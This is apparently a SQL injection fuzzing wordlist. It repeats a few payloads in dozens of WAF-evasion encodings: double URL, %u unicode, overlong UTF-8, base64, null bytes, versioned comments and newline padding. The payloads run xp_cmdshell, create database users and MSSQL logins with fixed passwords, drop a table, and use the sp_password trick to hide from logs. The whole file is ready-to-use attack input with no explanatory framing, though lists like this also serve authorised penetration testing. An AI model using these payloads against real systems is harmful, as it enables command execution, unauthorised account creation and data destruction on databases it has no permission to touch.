# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
%00
IyB5b3Ugd2lsbCBuZWVkIHRvIGN1c3RvbWl6ZS9tb2RpZnkgc29tZSBvZiB0aGUgdmF1bGVzIGluIHRoZSBxdWVyaWVzIGZvciBiZXN0IGVmZmVjdAo=
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%2523%2520%2579%256F%2575%2520%2577%2569%256C%256C%2520%256E%2565%2565%2564%2520%2574%256F%2520%2563%2575%2573%2574%256F%256D%2569%257A%2565%252F%256D%256F%2564%2569%2566%2579%2520%2573%256F%256D%2565%2520%256F%2566%2520%2574%2568%2565%2520%2576%2561%2575%256C%2565%2573%2520%2569%256E%2520%2574%2568%2565%2520%2571%2575%2565%2572%2569%2565%2573%2520%2566%256F%2572%2520%2562%2565%2573%2574%2520%2565%2566%2566%2565%2563%2574%250A
%23%20%79%6F%75%20%77%69%6C%6C%20%6E%65%65%64%20%74%6F%20%63%75%73%74%6F%6D%69%7A%65%2F%6D%6F%64%69%66%79%20%73%6F%6D%65%20%6F%66%20%74%68%65%20%76%61%75%6C%65%73%20%69%6E%20%74%68%65%20%71%75%65%72%69%65%73%20%66%6F%72%20%62%65%73%74%20%65%66%66%65%63%74%0A
%u0023%u0020%u0079%u006F%u0075%u0020%u0077%u0069%u006C%u006C%u0020%u006E%u0065%u0065%u0064%u0020%u0074%u006F%u0020%u0063%u0075%u0073%u0074%u006F%u006D%u0069%u007A%u0065%u002F%u006D%u006F%u0064%u0069%u0066%u0079%u0020%u0073%u006F%u006D%u0065%u0020%u006F%u0066%u0020%u0074%u0068%u0065%u0020%u0076%u0061%u0075%u006C%u0065%u0073%u0020%u0069%u006E%u0020%u0074%u0068%u0065%u0020%u0071%u0075%u0065%u0072%u0069%u0065%u0073%u0020%u0066%u006F%u0072%u0020%u0062%u0065%u0073%u0074%u0020%u0065%u0066%u0066%u0065%u0063%u0074%u000A
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%C0%AB%C0%AAyou%C0%AAwill%C0%AAneed%C0%AAto%C0%AAcustomize%C0%AFmodify%C0%AAsome%C0%AAof%C0%AAthe%C0%AAvaules%C0%AAin%C0%AAthe%C0%AAqueries%C0%AAfor%C0%AAbest%C0%AAeffect%C0%8A
%# %y%o%u %w%i%l%l %n%e%e%d %t%o %c%u%s%t%o%m%i%z%e%/%m%o%d%i%f%y %s%o%m%e %o%f %t%h%e %v%a%u%l%e%s %i%n %t%h%e %q%u%e%r%i%e%s %f%o%r %b%e%s%t %e%f%f%e%c%t%

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
 and '0having'='0having'
# you will need to customize/modify some of the vaules in the queries for best effect
sp_password
#/**/you/**/will/**/need/**/to/**/customize/modify/**/some/**/of/**/the/**/vaules/**/in/**/the/**/queries/**/for/**/best/**/effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%01you%02will%0Dneed%08to%09customize/modify%0Csome%09of%0Athe%0Fvaules%0Din%04the%05queries%0Cfor%03best%01effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%0Cyou%0Cwill%0Cneed%0Cto%09customize/modify%0Csome%0Dof%0Dthe%0Bvaules%0Din%0Bthe%0Aqueries%0Bfor%0Bbest%0Beffect

# you will need to customize/modify some of the vaules in the queries for best effect

#+you+will+need+to+customize/modify+some+of+the+vaules+in+the+queries+for+best+effect

#%09you%0Awill%0Dneed%09to%0Acustomize/modify%0Csome%09of%0Dthe%0Cvaules%0Cin%0Athe%09queries%0Dfor%0Cbest%09effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%EF%BC%87; exec master..xp_cmdshell %EF%BC%87ping 10.10.1.2%EF%BC%87--

%00%27; exec master..xp_cmdshell %00%27ping 10.10.1.2%00%27--

%u0027%u0063%u0072%u0065%u0061%u0074%u0065%u0020%u0075%u0073%u0065%u0072%u0020%u006E%u0061%u006D%u0065%u0020%u0069%u0064%u0065%u006E%u0074%u0069%u0066%u0069%u0065%u0064%u0020%u0062%u0079%u0020%u0027%u0070%u0061%u0073%u0073%u0031%u0032%u0033%u0027%u0020%u002D%u002D%u000A
'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

'create /*!30314user name identified by 'pass123' */--

'create /*!00000user name identified by 'pass123' */--

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

%C0%AFcreate%C0%AAuser%C0%AAname%C0%AAidentified%C0%AAby%C0%AA%C0%AFpass123%C0%AF%C0%AA%C0%AF%C0%AF%C0%8A
%'%c%r%e%a%t%e %u%s%e%r %n%a%m%e %i%d%e%n%t%i%f%i%e%d %b%y %'%p%a%s%s%1%2%3%' %-%-%

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --
 and '0having'='0having'
'create user name identified by 'pass123' --
-- sp_password
'create/**/user/**/name/**/identified/**/by/**/'pass123'/**/--

'create--PHTrvKpscrrS%0Auser--PpqDZhCT%0Aname--dTSGUtnuHmo%0Aidentified--ZhwqggKhtyek%0Aby--MVQMtTEN%0A'pass123'--vaQzYyiQWPfK%0A----xFcBhPGbiSs%0A
'create%23bWeStSVMsu%0Auser%23omCLwuFUe%0Aname%23anevQfA%0Aidentified%23gHanITXL%0Aby%23KjfZBdn%0A'pass123'%23hdZzWjOwv%0A--%23TUltmfVZmI%0A
'create%23vWsPxVBlrpCr%0Auser%23CIwGmykL%0Aname%23xFsmGrbjGpMO%0Aidentified%23IQzxPYpO%0Aby%23GqyrTSEDtM%0A'pass123'%23eDyJkvcIX%0A--%23bNquAzJaYsY%0A
'create%06user%05name%0Didentified%07by%0D'pass123'%0C--

'create%23%0Auser%23%0Aname%23%0Aidentified%23%0Aby%23%0A'pass123'%23%0A--%23%0A
'create%0Cuser%0Dname%0Cidentified%0Aby%09'pass123'%0B--

'create--%0Auser--%0Aname--%0Aidentified--%0Aby--%0A'pass123'--%0A----%0A
'create+user+name+identified+by+'pass123'+--

'create%09user%0Dname%0Aidentified%0Cby%0A'pass123'%09--

'create user name identified by 'pass123' --

%bf%27create user name identified by 'pass123' --

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

%EF%BC%87create user name identified by pass123 temporary tablespace temp default tablespace users; 

%00%27create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 
%00
J2NyZWF0ZSB1c2VyIG5hbWUgaWRlbnRpZmllZCBieSBwYXNzMTIzIHRlbXBvcmFyeSB0YWJsZXNwYWNlIHRlbXAgZGVmYXVsdCB0YWJsZXNwYWNlIHVzZXJzOyAK
'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

%2527%2563%2572%2565%2561%2574%2565%2520%2575%2573%2565%2572%2520%256E%2561%256D%2565%2520%2569%2564%2565%256E%2574%2569%2566%2569%2565%2564%2520%2562%2579%2520%2570%2561%2573%2573%2531%2532%2533%2520%2574%2565%256D%2570%256F%2572%2561%2572%2579%2520%2574%2561%2562%256C%2565%2573%2570%2561%2563%2565%2520%2574%2565%256D%2570%2520%2564%2565%2566%2561%2575%256C%2574%2520%2574%2561%2562%256C%2565%2573%2570%2561%2563%2565%2520%2575%2573%2565%2572%2573%253B%2520%250A
%27%63%72%65%61%74%65%20%75%73%65%72%20%6E%61%6D%65%20%69%64%65%6E%74%69%66%69%65%64%20%62%79%20%70%61%73%73%31%32%33%20%74%65%6D%70%6F%72%61%72%79%20%74%61%62%6C%65%73%70%61%63%65%20%74%65%6D%70%20%64%65%66%61%75%6C%74%20%74%61%62%6C%65%73%70%61%63%65%20%75%73%65%72%73%3B%20%0A
%u0027%u0063%u0072%u0065%u0061%u0074%u0065%u0020%u0075%u0073%u0065%u0072%u0020%u006E%u0061%u006D%u0065%u0020%u0069%u0064%u0065%u006E%u0074%u0069%u0066%u0069%u0065%u0064%u0020%u0062%u0079%u0020%u0070%u0061%u0073%u0073%u0031%u0032%u0033%u0020%u0074%u0065%u006D%u0070%u006F%u0072%u0061%u0072%u0079%u0020%u0074%u0061%u0062%u006C%u0065%u0073%u0070%u0061%u0063%u0065%u0020%u0074%u0065%u006D%u0070%u0020%u0064%u0065%u0066%u0061%u0075%u006C%u0074%u0020%u0074%u0061%u0062%u006C%u0065%u0073%u0070%u0061%u0063%u0065%u0020%u0075%u0073%u0065%u0072%u0073%u003B%u0020%u000A
'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create /*!30418user name identified by pass123 temporary tablespace temp default tablespace users; 
*/
'create /*!00000user name identified by pass123 temporary tablespace temp default tablespace users; 
*/
'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

%C0%AFcreate%C0%AAuser%C0%AAname%C0%AAidentified%C0%AAby%C0%AApass123%C0%AAtemporary%C0%AAtablespace%C0%AAtemp%C0%AAdefault%C0%AAtablespace%C0%AAusers%C0%BB%C0%AA%C0%8A
%'%c%r%e%a%t%e %u%s%e%r %n%a%m%e %i%d%e%n%t%i%f%i%e%d %b%y %p%a%s%s%1%2%3 %t%e%m%p%o%r%a%r%y %t%a%b%l%e%s%p%a%c%e %t%e%m%p %d%e%f%a%u%l%t %t%a%b%l%e%s%p%a%c%e %u%s%e%r%s%; %

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 
 and '0having'='0having'
'create user name identified by pass123 temporary tablespace temp default tablespace users; 
-- sp_password
'create/**/user/**/name/**/identified/**/by/**/pass123/**/temporary/**/tablespace/**/temp/**/default/**/tablespace/**/users;/**/

'create--oJMKEl%0Auser--ejTOeZGbJY%0Aname--teRABk%0Aidentified--FjrWAM%0Aby--HNnqxC%0Apass123--ziIvfuL%0Atemporary--DnQcfiHocQxV%0Atablespace--iviYVyNadkZ%0Atemp--MzoesVm%0Adefault--hlmMlhJfdyW%0Atablespace--knRIfovj%0Ausers;--fLSSFQR%0A--GerOoj%0A
'create%23XccecIC%0Auser%23sRgVrpUOHk%0Aname%23HhduHCxj%0Aidentified%23TpOXUWuv%0Aby%23jIAbYf%0Apass123%23PTKgDBl%0Atemporary%23fAtaJTvJuTg%0Atablespace%23tGuiaBV%0Atemp%23lXxSXHV%0Adefault%23sZgRemOiTY%0Atablespace%23zuglEB%0Ausers;%23OMPgSuwFickq%0A%23xnndUQQuYnua%0A
'create%23yaKguP%0Auser%23lIpCVbgphA%0Aname%23eIkgxqVMvY%0Aidentified%23WwtCzu%0Aby%23BqYLbjiV%0Apass123%23wysGELgmfCvH%0Atemporary%23VaaZAg%0Atablespace%23uRKdFc%0Atemp%23qSFUOJSn%0Adefault%23IkAyJEsW%0Atablespace%23OMdATZDtJ%0Ausers;%23uoamGi%0A%23RmpsoOTwH%0A
'create%02user%03name%0Bidentified%0Dby%0Epass123%01temporary%0Atablespace%0Ftemp%0Edefault%06tablespace%09users;%0A

'create%23%0Auser%23%0Aname%23%0Aidentified%23%0Aby%23%0Apass123%23%0Atemporary%23%0Atablespace%23%0Atemp%23%0Adefault%23%0Atablespace%23%0Ausers;%23%0A%23%0A
'create%0Buser%0Bname%0Bidentified%0Aby%09pass123%0Dtemporary%0Ctablespace%09temp%0Adefault%09tablespace%09users;%0C

'create--%0Auser--%0Aname--%0Aidentified--%0Aby--%0Apass123--%0Atemporary--%0Atablespace--%0Atemp--%0Adefault--%0Atablespace--%0Ausers;--%0A--%0A
'create+user+name+identified+by+pass123+temporary+tablespace+temp+default+tablespace+users;+

'create%0Cuser%0Cname%0Aidentified%0Aby%0Cpass123%0Dtemporary%0Dtablespace%0Dtemp%0Cdefault%0Ctablespace%0Ausers;%0C

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

%bf%27create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

'create user name identified by pass123 temporary tablespace temp default tablespace users; 

%EF%BC%87 ; drop table temp --

%00%27 ; drop table temp --

' ; drop table temp --
%00
JyA7IGRyb3AgdGFibGUgdGVtcCAtLQo=
' ; drop table temp --

' ; drop table temp --

%2527%2520%253B%2520%2564%2572%256F%2570%2520%2574%2561%2562%256C%2565%2520%2574%2565%256D%2570%2520%252D%252D%250A
%27%20%3B%20%64%72%6F%70%20%74%61%62%6C%65%20%74%65%6D%70%20%2D%2D%0A
%u0027%u0020%u003B%u0020%u0064%u0072%u006F%u0070%u0020%u0074%u0061%u0062%u006C%u0065%u0020%u0074%u0065%u006D%u0070%u0020%u002D%u002D%u000A
' ; drop table temp --

' ; drop table temp --

' ; drop table temp --

' ; drop table temp --

' ; drop table temp --

' ; drop table temp --

' /*!30172; drop table temp */--

' /*!00000; drop table temp */--

' ; drop table temp --

' ; drop table temp --

%C0%AF%C0%AA%C0%BB%C0%AAdrop%C0%AAtable%C0%AAtemp%C0%AA%C0%AF%C0%AF%C0%8A
%' %; %d%r%o%p %t%a%b%l%e %t%e%m%p %-%-%

' ; drop table temp --

' ; drop table temp --

' ; drop table temp --
 and '0having'='0having'
' ; drop table temp --
-- sp_password
'/**/;/**/drop/**/table/**/temp/**/--

'--WPzyuNRkIGg%0A;--nzIosSnppmP%0Adrop--xSVAIN%0Atable--ZaliUCHjQY%0Atemp--wxMDUzrkx%0A----kwGJTbpBf%0A
'%23UshxLZktP%0A;%23dTypkyG%0Adrop%23guKpJrXhrPR%0Atable%23RIVDiKKjt%0Atemp%23RjXVyIVFQhU%0A--%23hbysPYt%0A
'%23bTWwIWACbYvy%0A;%23tNDGBWYkzpHm%0Adrop%23npMKPoOp%0Atable%23pkQDma%0Atemp%23qszHSo%0A--%23nkMooXURgE%0A
'%0A;%02drop%0Ctable%03temp%0D--

'%23%0A;%23%0Adrop%23%0Atable%23%0Atemp%23%0A--%23%0A
'%0D;%0Adrop%0Dtable%0Ctemp%09--

'--%0A;--%0Adrop--%0Atable--%0Atemp--%0A----%0A
'+;+drop+table+temp+--

'%09;%0Adrop%09table%0Dtemp%0D--

' ; drop table temp --

%bf%27 ; drop table temp --

' ; drop table temp --

' ; drop table temp --

' ; drop table temp --

' ; drop table temp --

%EF%BC%87exec sp_addlogin %EF%BC%87name%EF%BC%87 , %EF%BC%87password%EF%BC%87 --

%00%27exec sp_addlogin %00%27name%00%27 , %00%27password%00%27 --

'exec sp_addlogin 'name' , 'password' --
%00
J2V4ZWMgc3BfYWRkbG9naW4gJ25hbWUnICwgJ3Bhc3N3b3JkJyAtLQo=
'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

%2527%2565%2578%2565%2563%2520%2573%2570%255F%2561%2564%2564%256C%256F%2567%2569%256E%2520%2527%256E%2561%256D%2565%2527%2520%252C%2520%2527%2570%2561%2573%2573%2577%256F%2572%2564%2527%2520%252D%252D%250A
%27%65%78%65%63%20%73%70%5F%61%64%64%6C%6F%67%69%6E%20%27%6E%61%6D%65%27%20%2C%20%27%70%61%73%73%77%6F%72%64%27%20%2D%2D%0A
%u0027%u0065%u0078%u0065%u0063%u0020%u0073%u0070%u005F%u0061%u0064%u0064%u006C%u006F%u0067%u0069%u006E%u0020%u0027%u006E%u0061%u006D%u0065%u0027%u0020%u002C%u0020%u0027%u0070%u0061%u0073%u0073%u0077%u006F%u0072%u0064%u0027%u0020%u002D%u002D%u000A
'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

'exec /*!30337sp_addlogin 'name' , 'password' */--

'exec /*!00000sp_addlogin 'name' , 'password' */--

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

%C0%AFexec%C0%AAsp%C0%DFaddlogin%C0%AA%C0%AFname%C0%AF%C0%AA%C0%AE%C0%AA%C0%AFpassword%C0%AF%C0%AA%C0%AF%C0%AF%C0%8A
%'%e%x%e%c %s%p%_%a%d%d%l%o%g%i%n %'%n%a%m%e%' %, %'%p%a%s%s%w%o%r%d%' %-%-%

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --

'exec sp_addlogin 'name' , 'password' --
 and '0having'='0having'
'exec sp_addlogin 'name' , 'password' --
-- sp_password
'exec/**/sp_addlogin/**/'name'/**/,/**/'password'/**/--

